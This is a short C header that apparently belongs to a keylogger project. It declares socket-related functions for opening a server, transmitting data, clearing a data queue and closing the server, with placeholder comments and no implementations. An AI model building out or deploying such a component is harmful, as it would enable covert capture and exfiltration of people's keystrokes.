#pragma once
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include "keylogger.h"


/**
 * Documentation here
 */
void open_server(void);

/**
 * Documentation here
 */
void transmit_data(void);

/**
 * Documentation here
 */
void clear_data_queue(void);

/**
 * Documentation here
 */
void close_server(void);
